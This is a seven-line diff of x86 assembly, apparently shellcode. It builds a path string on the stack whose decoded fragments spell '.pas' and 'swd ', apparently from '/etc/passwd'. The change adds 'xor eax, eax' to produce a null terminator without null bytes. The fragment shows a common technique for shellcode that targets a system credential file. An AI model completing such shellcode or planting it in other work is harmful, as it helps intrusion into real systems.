@@ -12,6 +12,7 @@ _start:
 	push 0x20647773
 	push 0x7361702e
 	mov ecx, esp
+	xor eax, eax
 	push eax
 	push ecx
 	push ebx
